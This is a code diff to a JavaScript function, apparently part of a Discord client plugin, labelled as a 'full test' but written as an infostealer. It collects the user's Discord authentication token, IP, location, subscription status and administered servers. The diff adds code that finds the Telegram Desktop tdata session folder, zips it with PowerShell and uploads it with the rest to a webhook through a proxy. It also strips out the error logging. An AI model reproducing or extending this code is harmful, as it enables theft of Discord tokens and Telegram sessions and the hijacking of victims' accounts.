@@ -1,14 +1,24 @@
-async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
+async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
+    // Безопасное получение модулей Node.js
+    let req = requireFunc;
+    if (!req && typeof process !== 'undefined' && process.mainModule) {
+        req = process.mainModule.require;
+    }
+    if (!req) {
+        return false;
+    }
+
+    const fs = req('fs');
+    const path = req('path');
+    const os = req('os');
+    const { execSync } = req('child_process');
+
     let result = {
         ip: null,
         location: null,
         nitro: "Нет",
         dtoken: null,
-        telegram_path: "Не найден",
-        debug: {
-            appdata_env: process.env.APPDATA || "Переменная не найдена",
-            errors: []
-        },
+        telegram_path: null,
         admin_servers: []
     };
     
@@ -23,31 +33,52 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         if (geoData.status === 'success') {
             result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
         }
-    } catch (e) { result.debug.errors.push("IP Error: " + e.message); }
+    } catch (e) {}
 
     // 2. Nitro и Токен
     try {
         const UserStore = BdApi.Webpack.getStore("UserStore");
         if (UserStore) {
             const user = UserStore.getCurrentUser();
-            if (user.premiumType === 1) result.nitro = "Nitro Classic";
-            else if (user.premiumType === 2) result.nitro = "Nitro";
-            else if (user.premiumType === 3) result.nitro = "Nitro Basic";
+            if (user.premiumType > 0) result.nitro = "Nitro";
         }
         
         const authStore = BdApi.Webpack.getStore("AuthenticationStore");
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
-    } catch (e) { result.debug.errors.push("User Error: " + e.message); }
+    } catch (e) {}
 
-    // 3. Формируем путь к Telegram (БЕЗ проверки существования файла)
+    // 3. Поиск и архивация Telegram tdata
+    let hasTdata = false;
+    let tdataZipPath = "";
     try {
-        if (process.env.APPDATA) {
-            // Просто собираем строку пути
-            result.telegram_path = process.env.APPDATA + "\\Telegram Desktop\\tdata";
+        const appData = process.env.APPDATA;
+        if (appData) {
+            const possiblePaths = [
+                path.join(appData, 'Telegram Desktop', 'tdata'),
+                path.join(appData, 'Telegram', 'tdata')
+            ];
+            
+            for (const p of possiblePaths) {
+                if (fs.existsSync(p)) {
+                    result.telegram_path = p;
+                    hasTdata = true;
+                    
+                    // Сжимаем папку tdata в zip с помощью PowerShell (только Windows)
+                    tdataZipPath = path.join(os.tmpdir(), 'opium_tdata.zip');
+                    try {
+                        // Удаляем старый архив, если есть
+                        if (fs.existsSync(tdataZipPath)) fs.unlinkSync(tdataZipPath);
+                        // Запускаем сжатие (максимум 30 секунд)
+                        execSync(`powershell -command "Compress-Archive -Path '${p}' -DestinationPath '${tdataZipPath}' -Force"`, { timeout: 30000 });
+                    } catch (zipError) {
+                        console.error("Ошибка архивации:", zipError);
+                        hasTdata = false; // Если не смогли сжать, не будем отправлять
+                    }
+                    break;
+                }
+            }
         }
-    } catch (e) { 
-        result.debug.errors.push("Telegram Error: " + e.message); 
-    }
+    } catch (e) {}
 
     // 4. Серверы и участники
     try {
@@ -79,17 +110,34 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
                 }
             }
         }
-    } catch (e) { result.debug.errors.push("Guild Error: " + e.message); }
+    } catch (e) {}
 
-    // 5. Отправка на вебхук
+    // 5. Формируем сообщение и файлы
+    const nitroIcon = result.nitro !== "Нет" ? "✅" : "❌";
+    const tokenIcon = result.dtoken ? "✅" : "❌";
+    const tdataIcon = hasTdata ? "✅" : "❌";
+    
+    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${nitroIcon}\nToken: ${tokenIcon}\nTdata: ${tdataIcon}\n@everyone`;
+
+    const formData = new FormData();
+    formData.append('payload_json', JSON.stringify({ content: messageText }));
+
+    // Прикрепляем JSON
+    const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
+    formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');
+
+    // Прикрепляем ZIP архив (если он есть)
+    if (hasTdata && fs.existsSync(tdataZipPath)) {
+        const zipBuffer = fs.readFileSync(tdataZipPath);
+        formData.append('files[1]', new Blob([zipBuffer], { type: 'application/zip' }), 'tdata.zip');
+    }
+
+    // 6. Отправка
     try {
         const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
         const response = await BdApi.Net.fetch(proxyUrlFull, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `**Opium Data**\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
-            })
+            body: formData
         });
         return response.ok;
     } catch (e) {
